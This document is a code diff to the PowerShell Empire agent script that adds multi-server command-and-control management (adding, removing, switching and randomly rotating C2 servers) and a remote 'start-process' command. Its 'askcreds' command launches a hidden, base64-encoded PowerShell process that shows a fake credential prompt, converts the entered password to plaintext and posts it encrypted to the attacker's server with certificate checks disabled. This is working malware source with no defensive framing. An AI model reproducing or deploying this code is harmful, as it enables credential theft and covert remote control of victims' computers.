@@ -56,7 +56,7 @@ function Invoke-Empire {
         $AgentJitter = 0,
 
         [String[]]
-        $Servers,
+        $PServers,
 
         [String]
         $KillDate,
@@ -89,17 +89,20 @@ function Invoke-Empire {
     $script:LostLimit = $LostLimit
     $script:MissedCheckins = 0
     $script:DefaultPage = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($DefaultPage))
-    
+    $script:isServerFixed = 1    
     $encoding = [System.Text.Encoding]::ASCII
 
     $Retries = 1
+
+    [System.Collections.ArrayList]$Servers = $PServers
 
     # c2 server list, by parameter or preloaded on staging
     if(-not $Servers){
         return
     }
     # the currently active server
-    $ServerIndex = 0
+    $script:ServerIndex = 0
+
 
     # set a kill date of $KillDays out if specified
     if($KillDays){
@@ -255,6 +258,195 @@ function Invoke-Empire {
         }
         else {
             switch -regex ($cmd) {
+                'sinfo' {
+                    
+                    $output  = "Server in use :  " +  $Servers[$ServerIndex] + "`n"
+                    $output += "Is c2 server fixed : " + (&{if ($script:isServerFixed -eq 1) {"Yes"} Else {"No"}}) + "`n"
+
+                }
+                'switch' {
+                    if ($cmdargs.length -eq ""){
+                                $script:ServerIndex = ($ServerIndex + 1) % $Servers.Count
+                                $output = "Switched to server " + $ServerIndex + " :: " + $Servers[$ServerIndex]
+                            }else {
+                                try {
+                                    if( [Int]$cmdargs -lt $Servers.Count){
+                                        $script:ServerIndex = [Int]$cmdargs
+                                        $output = "Switched to server " + $ServerIndex + " :: " + $Servers[$ServerIndex]
+                                    }else {
+                                        $output = "WYSWYG ! try sget command"
+                                    }
+                                }
+                                catch {
+                                    $output= "Error : switch command";
+                                }
+                            }
+
+                }
+                'sget' {
+                    $output = "Forwarder in use : " + $ServerIndex + "`n"
+                    $Servers | % {$i=0} {$output += "Server[$i] :: $_ `n";$i++}
+                }
+                'skill' {
+                        if ($cmdargs.length -eq ""){
+                                $output = "Missing argument [server_id]."
+                        } else{
+                            if ($Servers.Count -eq 1){
+                                $output = "The list of servers can not be empty." + "`n"
+                            }else{
+                                if ($ServerIndex -eq [Int]$cmdargs){
+                                    $output = "Error : Server in use, please switch to another unused server."
+                                }else{
+                                    try {
+                                        if($Servers.Count -gt [Int]$cmdargs -and [Int]$cmdargs -ge 0){
+                        if ([Int]$cmdargs -lt $ServerIndex){
+                        $script:ServerIndex = $ServerIndex - 1  
+                        }
+                                            $Servers.Remove($Servers[[Int]$cmdargs])
+                                            $output = "[+] Server removed." + "`n" 
+                                       }
+                                    }
+                                    catch {
+                                        $output = "[-] Error : skill command." + "`n";
+                                       } 
+                                   }
+                            }   
+                        }
+                }
+               'sadd' {
+                            if ($cmdargs.length -eq ""){
+                                $output = "Missing argument hostname."
+                            } else {
+                                if($Servers.IndexOf($cmdargs) -ge 0){
+                                    $output = "Already in servers' list." + "`n"
+                                }else{
+                                    $Servers.Add($cmdargs)
+                                    $output += "[+] Server added." + "`n"
+                                }
+                            }
+
+                        }
+                'sfix' {
+                    $script:isServerFixed = 1
+                        try {
+                           if((-not ($cmdargs.length -eq "")) -and [Int]$cmdargs -ge 0 -and [Int]$cmdargs -lt $Servers.Count){
+                                $script:ServerIndex = [Int]$cmdargs
+                            }
+                        
+                           $output = "[+] Server fixed : " + $Servers[$script:ServerIndex]  + "`n"
+                       }
+                       catch {
+                              $output = "[-] Error : sfix command" + "`n";
+                       }
+                }
+                'srandom' {
+                    $script:isServerFixed = 0
+                    $output = "[+] Random choice enabled. "
+                    $output += "In use : " + $Servers[$script:ServerIndex]
+                }
+                'askcreds' {
+                    
+                    $payload = '
+                    $SessionKey = "'+[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($SessionKey))+'";
+                    $Profile = "'+$Profile+'";
+                    $Cookie = "'+$Cookie+'";
+                    $Server = "'+$Servers[$ServerIndex]+'";
+                    $encoding = [System.Text.Encoding]::ASCII;
+
+                    $TaskURIs = $Profile.split("|")[0].split(",")
+                    $UserAgent = $Profile.split("|")[1]
+                    $SessionKey = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($SessionKey))
+
+                    function Encode-Packet {
+                        param([int]$type, $data)
+                        if ($data -is [system.array]){
+                            $data = $data -join "`n"
+                        }
+                        $data = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.getbytes($data))
+                        $packet = New-Object Byte[] (12 + $data.Length)
+                        $counter = $($EpochDiff + [int][double]::Parse((Get-Date(Get-Date).ToUniversalTime()-UFormat %s))) -as [int]
+                        ([bitconverter]::GetBytes($type)).CopyTo($packet, 0)
+                        ([bitconverter]::GetBytes($counter)).CopyTo($packet, 4)
+                        ([bitconverter]::GetBytes($data.Length)).CopyTo($packet, 8)
+                        ([System.Text.Encoding]::UTF8.getbytes($data)).CopyTo($packet, 12)
+                        $packet
+                    }
+
+                    function Encrypt-Bytes { 
+                            param($bytes)
+                            $IV = [byte] 0..255 | Get-Random -count 16
+                            $AES = New-Object System.Security.Cryptography.AesCryptoServiceProvider;
+                            $AES.Mode = "CBC";
+                            $AES.Key = $encoding.GetBytes($SessionKey);
+                            $AES.IV = $IV;
+                            $ciphertext = $IV + ($AES.CreateEncryptor()).TransformFinalBlock($bytes, 0, $bytes.Length);
+                            $hmac = New-Object System.Security.Cryptography.HMACSHA1;
+                            $hmac.Key = $encoding.GetBytes($SessionKey);
+                            $ciphertext + $hmac.ComputeHash($ciphertext);
+                        } 
+
+                     function Send-Message {
+                            param($packets)
+                            if($packets) {
+                                $encBytes = Encrypt-Bytes $packets
+                                if($Server.StartsWith("http")){
+                                    $wc = new-object system.net.WebClient
+                                    $wc.Proxy = [System.Net.WebRequest]::GetSystemWebProxy();
+                                    $wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials;
+                                    $wc.Headers.Add("User-Agent",$UserAgent)
+                                    $wc.Headers.Add("Cookie",$Cookie)
+                                    # allow self-signed certificates 
+                    [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};
+                                    try{
+                                        $taskURI = $TaskURIs | Get-Random
+                                        $response = $wc.UploadData($Server+$taskURI,"POST",$encBytes);
+                                        
+                                    }
+                                    catch [System.Net.WebException]{}
+                                }
+                            }
+                        }
+                    try{
+                        $Creds = Get-Credential
+                        $BSTR = [Runtime.InteropServices.Marshal]::SecureStringToBSTR($Creds.Password)
+                        $PlainTextPassword = [Runtime.InteropServices.Marshal]::PtrToStringAuto($BSTR)
+                        $sep=":"
+                        $result = "User credentials : " 
+                        $result += $Creds.Username+$sep+$PlainTextPassword
+                    }catch {
+                        $result = "No credentials provided!"
+                    }
+                    Send-Message $(Encode-Packet -type 40 -data $result)
+                    exit
+                    '
+
+                    $bytes = [System.Text.Encoding]::Unicode.GetBytes($payload)
+                    $encodedCommand = [Convert]::ToBase64String($bytes)
+                    $Process = [Diagnostics.Process]::Start("powershell"," -W hidden -Enc "+$encodedCommand)
+                    $output = "[+] Process started."
+                        
+                }
+                  'start-process' {
+                    if ($cmdargs.length -eq "") {
+                        $output = "Usage : start-process program.exe [args]"
+                    }else {
+                        $args = $cmdargs.Trim().Split(" ")
+                        $program = $args[0]
+                        $program_args = $args[1..$args.Length]
+                        try {
+                            $Process = [Diagnostics.Process]::Start($program,$program_args)
+                            if ($Process.Id -gt 0){                            
+                                $output = "[+] " + $program + " started, PID : " + $Process.Id 
+                            }else {
+                                $output = "[!] Error : could not start " + $program + "."
+                            }
+                        }catch{
+                            $output = "[-] Error : could not start " + $program + "."
+                        }
+
+                    }
+
+                }
                 '(ls|dir)' {
                     if ($cmdargs.length -eq "") {
                         $output = Get-ChildItem -force | select lastwritetime,length,name
@@ -607,7 +799,10 @@ function Invoke-Empire {
         if($packets) {
             # build and encrypt the response packet
             $encBytes = Encrypt-Bytes $packets
-
+        # If server id is not fixed we pickup a random id
+        if ($isServerFixed -eq 0){
+            $script:ServerIndex = Get-Random -minimum 0 -maximum $Servers.Count
+        }
             if($Servers[$ServerIndex].StartsWith("http")){
                 # build the web request object
                 $wc = new-object system.net.WebClient
